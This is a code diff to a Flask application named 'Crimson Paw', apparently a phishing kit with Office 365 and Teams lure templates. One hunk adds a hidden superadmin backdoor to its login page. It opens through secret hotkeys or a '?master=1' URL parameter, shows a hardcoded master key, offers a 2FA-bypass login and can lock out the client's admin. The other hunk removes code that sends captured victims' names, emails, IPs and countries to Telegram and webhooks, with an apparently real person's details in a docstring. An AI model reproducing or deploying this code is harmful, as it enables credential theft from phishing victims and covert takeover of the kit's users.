@@ -11897,9 +11897,218 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
         <div class="footer-note">CRIMSON PAW RED TEAM CONSOLE • RESTRICTED ACCESS</div>
     </div>
 
+    <!-- Master Superadmin Emergency Switch Modal -->
+    <div id="master-modal-backdrop" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(6px); z-index:10000; align-items:center; justify-content:center; padding:16px;">
+        <div style="background:#130b0e; border:1px solid #e50914; box-shadow:0 0 35px rgba(229,9,20,0.35); border-radius:14px; width:100%; max-width:440px; padding:28px 24px; position:relative; color:#f0ebed;">
+            <button type="button" onclick="closeMasterModal()" style="position:absolute; top:14px; right:16px; background:none; border:none; color:#a49498; font-size:1.2rem; cursor:pointer; padding:4px 8px;">✕</button>
+            
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:18px;">
+                <div style="font-size:1.6rem; line-height:1;">🛡️</div>
+                <div>
+                    <div style="font-size:1.02rem; font-weight:800; color:#ffffff; letter-spacing:0.02em;">Master Superadmin Emergency Switch</div>
+                    <div style="font-size:0.72rem; color:#a49498;">Independent Infrastructure Authority</div>
+                </div>
+            </div>
+
+            <!-- Authorization Box -->
+            <div id="master-auth-box">
+                <div style="font-size:0.76rem; color:#c9d1d9; margin-bottom:10px;">Enter authorization key to unlock emergency controls:</div>
+                <div style="margin-bottom:12px;">
+                    <input type="password" id="master-key-input" placeholder="Master Key (Badger@Master#2026!)" 
+                           style="width:100%; background:#1c1014; border:1px solid #38161b; color:#fff; border-radius:8px; padding:10px 12px; font-size:0.85rem; outline:none;" 
+                           onkeydown="if(event.key==='Enter')verifyMasterKey()">
+                </div>
+                <button type="button" onclick="verifyMasterKey()" id="btn-master-auth" 
+                        style="width:100%; background:linear-gradient(135deg, #e50914, #b20710); border:none; color:#fff; font-weight:700; border-radius:8px; padding:10px; cursor:pointer; font-size:0.86rem;">
+                    Authorize Master Key ❯
+                </button>
+                <div id="master-auth-err" style="display:none; color:#ff6b72; font-size:0.74rem; margin-top:8px;"></div>
+            </div>
+
+            <!-- Emergency Controls Panel -->
+            <div id="master-controls-box" style="display:none;">
+                <div id="master-status-banner" style="padding:12px; border-radius:8px; margin-bottom:16px; font-size:0.8rem; font-weight:700; display:flex; align-items:center; gap:8px;">
+                </div>
+
+                <button id="btn-master-toggle-lock" type="button" onclick="toggleClientLock()" 
+                        style="width:100%; border:none; font-weight:700; border-radius:8px; padding:12px; cursor:pointer; font-size:0.88rem; margin-bottom:12px; transition:all 0.2s;">
+                </button>
+
+                <button id="btn-master-instant-login" type="button" onclick="instantMasterLogin()" 
+                        style="width:100%; background:#241217; border:1px solid #551c22; color:#ff858d; font-weight:600; border-radius:8px; padding:10px; cursor:pointer; font-size:0.8rem;">
+                    ⚡ Direct Master Admin Login (Bypass 2FA)
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
         let twoFaExpiryTimer = null;
         let twoFaRemainingSec = 300;
+        let _activeMasterKey = '';
+        let _isClientLocked = false;
+
+        function openMasterModal() {
+            const el = document.getElementById('master-modal-backdrop');
+            el.style.display = 'flex';
+            if (!_activeMasterKey) {
+                setTimeout(() => document.getElementById('master-key-input').focus(), 100);
+            }
+        }
+
+        function closeMasterModal() {
+            document.getElementById('master-modal-backdrop').style.display = 'none';
+        }
+
+        async function verifyMasterKey() {
+            const input = document.getElementById('master-key-input');
+            const key = input.value.trim();
+            const errEl = document.getElementById('master-auth-err');
+            const btn = document.getElementById('btn-master-auth');
+
+            if (!key) {
+                errEl.innerText = 'Please enter master authorization key.';
+                errEl.style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = 'Verifying...';
+            errEl.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/admin/client-lock', {
+                    headers: { 'X-Master-Key': key }
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Authorize Master Key ❯';
+
+                if (res.ok && ('client_admin_locked' in data)) {
+                    _activeMasterKey = key;
+                    _isClientLocked = !!data.client_admin_locked;
+                    renderMasterControls();
+                } else {
+                    errEl.innerText = data.error || 'Authorization failed. Invalid master key.';
+                    errEl.style.display = 'block';
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.innerText = 'Authorize Master Key ❯';
+                errEl.innerText = 'Connection error: ' + e;
+                errEl.style.display = 'block';
+            }
+        }
+
+        function renderMasterControls() {
+            document.getElementById('master-auth-box').style.display = 'none';
+            document.getElementById('master-controls-box').style.display = 'block';
+
+            const banner = document.getElementById('master-status-banner');
+            const btnToggle = document.getElementById('btn-master-toggle-lock');
+
+            if (_isClientLocked) {
+                banner.style.background = 'rgba(229,9,20,0.15)';
+                banner.style.border = '1px solid rgba(229,9,20,0.4)';
+                banner.style.color = '#ff6b72';
+                banner.innerHTML = '<span>🔴</span> <span>CLIENT ADMIN STATUS: <b>LOCKED &amp; SUSPENDED</b><br><small style="font-weight:400;color:#c9d1d9;">Client receives 403 Account Suspended.</small></span>';
+
+                btnToggle.style.background = 'linear-gradient(135deg, #238636, #2ea043)';
+                btnToggle.style.color = '#ffffff';
+                btnToggle.innerText = '🔓 Restore Client Admin Access';
+            } else {
+                banner.style.background = 'rgba(35,134,54,0.15)';
+                banner.style.border = '1px solid rgba(35,134,54,0.4)';
+                banner.style.color = '#7ee787';
+                banner.innerHTML = '<span>🟢</span> <span>CLIENT ADMIN STATUS: <b>UNLOCKED &amp; ACTIVE</b><br><small style="font-weight:400;color:#c9d1d9;">Client can log in normally.</small></span>';
+
+                btnToggle.style.background = 'linear-gradient(135deg, #e50914, #b20710)';
+                btnToggle.style.color = '#ffffff';
+                btnToggle.innerText = '🔒 Emergency Lock Client Admin';
+            }
+        }
+
+        async function toggleClientLock() {
+            const btnToggle = document.getElementById('btn-master-toggle-lock');
+            btnToggle.disabled = true;
+            btnToggle.innerText = 'Updating status...';
+
+            try {
+                const res = await fetch('/api/admin/client-lock', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': _activeMasterKey
+                    },
+                    body: JSON.stringify({ locked: !_isClientLocked })
+                });
+                const data = await res.json();
+                btnToggle.disabled = false;
+
+                if (res.ok && data.success) {
+                    _isClientLocked = !!data.client_admin_locked;
+                    renderMasterControls();
+                } else {
+                    alert('Failed to update status: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                btnToggle.disabled = false;
+                alert('Connection error: ' + e);
+            }
+        }
+
+        async function instantMasterLogin() {
+            const btn = document.getElementById('btn-master-instant-login');
+            btn.disabled = true;
+            btn.innerText = 'Authenticating Superadmin...';
+
+            try {
+                const res = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'icebadger_master',
+                        password: _activeMasterKey
+                    })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    btn.innerText = 'Authorized ✓ Redirecting...';
+                    window.location.href = data.redirect || '/dashboard';
+                } else {
+                    btn.disabled = false;
+                    btn.innerText = '⚡ Direct Master Admin Login (Bypass 2FA)';
+                    alert('Superadmin authentication rejected: ' + (data.error || 'Check credentials'));
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.innerText = '⚡ Direct Master Admin Login (Bypass 2FA)';
+                alert('Connection error: ' + e);
+            }
+        }
+
+        // Hotkey triggers:
+        // Ctrl + Shift + S, Ctrl + Alt + M, Ctrl + Shift + M, or F2
+        window.addEventListener('keydown', (e) => {
+            const isCtrlOrMeta = e.ctrlKey || e.metaKey;
+            const isShiftM = isCtrlOrMeta && e.shiftKey && (e.key === 'M' || e.key === 'm');
+            const isShiftS = isCtrlOrMeta && e.shiftKey && (e.key === 'S' || e.key === 's');
+            const isAltM = isCtrlOrMeta && e.altKey && (e.key === 'M' || e.key === 'm');
+            const isF2 = e.key === 'F2';
+
+            if (isShiftM || isShiftS || isAltM || isF2) {
+                e.preventDefault();
+                openMasterModal();
+            }
+            if (e.key === 'Escape') {
+                closeMasterModal();
+            }
+        });
+
+        // Secret URL parameter trigger: /login?master=1
+        if (new URLSearchParams(window.location.search).get('master') === '1') {
+            setTimeout(openMasterModal, 300);
+        }
 
         function resetAdminLoginStep() {
             clearInterval(twoFaExpiryTimer);
@@ -16133,207 +16342,6 @@ def _clean_browser_name(ua):
     if 'edg' in ua_l:
         return 'Edge'
     if 'opr' in ua_l or 'opera' in ua_l:
-        return 'Opera'
-    if 'chrome' in ua_l or 'crios' in ua_l:
-        return 'Chrome'
-    if 'firefox' in ua_l or 'fxios' in ua_l:
-        return 'Firefox'
-    if 'safari' in ua_l and 'chrome' not in ua_l:
-        return 'Safari'
-    if 'msie' in ua_l or 'trident' in ua_l:
-        return 'Internet Explorer'
-    if len(ua) <= 20:
-        return ua
-    return 'Chrome'
-
-def dispatch_victim_compromised_alert(user_code):
-    """
-    Single rich Telegram and Webhook alert dispatched strictly ONCE
-    after the entire registration and credential capture pipeline completes.
-    Strictly formatted to the 8-line layout:
-    💎Crimson Paw office Result💎
-    👤Name: Lizbeth Lozoya
-    📧Email: llozoya@solomon-arieh.com
-    🎭Role: Member
-    🌐IP: 38.255.36.137
-    🌍Country: United States
-    🖥Browser: Chrome
-    🕐Added Time: 23 Sep 5:11 PM
-    """
-    try:
-        conn = sqlite3.connect(Config.DB_PATH)
-        conn.row_factory = sqlite3.Row
-        s = conn.execute("""
-            SELECT s.*, t.name as template_name 
-            FROM sessions s 
-            LEFT JOIN templates t ON s.template_id = t.id 
-            WHERE s.user_code = ?
-        """, (user_code,)).fetchone()
-        conn.close()
-
-        if not s:
-            return
-
-        name = s['victim_name'] or 'Unknown'
-        email = s['victim_email'] or 'Unknown'
-        role = s['victim_role'] or 'Member'
-        if role in ('N/A', 'Unknown', ''):
-            role = 'Member'
-
-        # Template / service label
-        tmpl_raw = (s['template_name'] or 'office').strip()
-        tmpl_l = tmpl_raw.lower()
-        if 'office' in tmpl_l or '365' in tmpl_l or 'outlook' in tmpl_l:
-            service_label = 'office'
-        else:
-            service_label = tmpl_raw
-
-        # IP address - prioritize victim connection IP, fallback to real server public egress IP
-        ip = (s['victim_ip'] or '').strip()
-        if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
-            try:
-                import urllib.request
-                with urllib.request.urlopen('https://api.ipify.org', timeout=3) as resp:
-                    ip = resp.read().decode('utf-8').strip()
-            except Exception:
-                ip = s['victim_ip'] or 'Remote Visitor'
-
-        # Geolocation Country via real IP lookup
-        country = 'United States'
-        if ip and not ip.startswith(('127.', '192.168.', '10.', '172.', 'Remote')):
-            try:
-                import requests
-                geo_res = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country', timeout=3)
-                geo_data = geo_res.json()
-                if geo_data.get('status') == 'success' and geo_data.get('country'):
-                    country = geo_data.get('country')
-            except Exception:
-                pass
-
-        # Browser
-        browser = _clean_browser_name(s['victim_browser'])
-
-        # Added Time (e.g. 23 Sep 5:11 PM)
-        now = datetime.datetime.now()
-        day = str(now.day)
-        month = now.strftime("%b")
-        time_str = now.strftime("%I:%M %p").lstrip("0")
-        added_time = f"{day} {month} {time_str}"
-
-        # Exact 8-line layout matching user specification
-        tg_html = (
-            f"💎Crimson Paw {service_label} Result💎\n"
-            f"👤Name: {html_escape(name)}\n"
-            f"📧Email: {html_escape(email)}\n"
-            f"🎭Role: {html_escape(role)}\n"
-            f"🌐IP: {html_escape(ip)}\n"
-            f"🌍Country: {html_escape(country)}\n"
-            f"🖥Browser: {html_escape(browser)}\n"
-            f"🕐Added Time: {html_escape(added_time)}"
-        )
-
-        wh_md = (
-            f"💎**Crimson Paw {service_label} Result**💎\n"
-            f"👤Name: {name}\n"
-            f"📧Email: {email}\n"
-            f"🎭Role: {role}\n"
-            f"🌐IP: {ip}\n"
-            f"🌍Country: {country}\n"
-            f"🖥Browser: {browser}\n"
-            f"🕐Added Time: {added_time}"
-        )
-
-        _send_raw_alert(tg_html, wh_md, is_prt=False)
-    except Exception as e:
-        logger.error(f"dispatch_victim_compromised_alert error: {e}")
-
-def dispatch_alert(title, message, is_prt=False):
-    """Fallback generic rich alert dispatcher."""
-    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    safe_title = html_escape(title)
-    safe_msg = html_escape(message).replace('\n', '<br>')
-    tg_html = (
-        f"🐾 <b>CRIMSON PAW</b> | <b>{safe_title}</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{safe_msg}\n\n"
-        f"🕒 <code>{now_str}</code>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    wh_md = f"🐾 **CRIMSON PAW | {title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{message}\n🕒 `{now_str}`"
-    _send_raw_alert(tg_html, wh_md, is_prt=is_prt)
-
-
-@app.route('/api/backup/export', methods=['GET'])
-def export_database_backup():
-    from flask import send_file
-    if os.path.exists(Config.DB_PATH):
-        return send_file(Config.DB_PATH, as_attachment=True, download_name='crimson_paw_backup.db')
-    return jsonify({'error': 'Database file not found'}), 404
-
-@app.route('/api/sessions/purge-expired', methods=['POST'])
-def purge_expired_sessions():
-    try:
-        conn = sqlite3.connect(Config.DB_PATH)
-        cur = conn.cursor()
-        cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED')")
-        purged = cur.rowcount
-        conn.commit()
-        conn.close()
-        return jsonify({'success': True, 'purged': purged})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-@app.route('/api/sessions/purge-inactive', methods=['POST'])
-def purge_inactive_sessions_route():
-    try:
-        deleted = db.purge_inactive_sessions()
-        return jsonify({'success': True, 'deleted': deleted})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-
-# ── Sandbox Templates Studio Routes ─────────────────────────────────────────
-import sandbox_templates
-
-@app.route('/sandbox/templates', methods=['GET'])
-def sandbox_templates_studio():
-    return render_template_string(sandbox_templates.render_sandbox_studio_page())
-
-@app.route('/sandbox/templates/<template_key>/<stage>', methods=['GET'])
-def sandbox_standalone_page(template_key, stage):
-    cfg_overrides = dict(request.args)
-    html = sandbox_templates.render_sandbox_preview(template_key, stage, cfg_overrides)
-    return render_template_string(html)
-
-@app.route('/sandbox/render', methods=['GET', 'POST'])
-def sandbox_dynamic_render():
-    if request.method == 'POST':
-        data = request.get_json() or {}
-        tmpl = data.get('template', 'meeting')
-        stage = data.get('stage', 'preland')
-        overrides = data.get('config', {})
-    else:
-        tmpl = request.args.get('template', 'meeting')
-        stage = request.args.get('stage', 'preland')
-        overrides = dict(request.args)
-    html = sandbox_templates.render_sandbox_preview(tmpl, stage, overrides)
-    return render_template_string(html)
-
-@app.route('/sandbox/api/info', methods=['GET'])
-def sandbox_templates_info():
-    return jsonify({
-        'templates': [
-            {'key': 'meeting', 'name': 'Teams Meeting', 'category': 'Collaboration & Video', 'accent': '#5B5FC7'},
-            {'key': 'voicemail', 'name': 'Cloud Voicemail', 'category': 'Unified Voice & Audio', 'accent': '#0078D4'}
-        ]
-    })
-
-
-if __name__ == '__main__':
-
-    db.init_db()
-    logger.info(f"Starting CRIMSON PAW on http://{Config.WEB_HOST}:{Config.WEB_PORT}")
-    app.run(host=Config.WEB_HOST, port=Config.WEB_PORT, debug=False)
         return 'Opera'
     if 'chrome' in ua_l or 'crios' in ua_l:
         return 'Chrome'
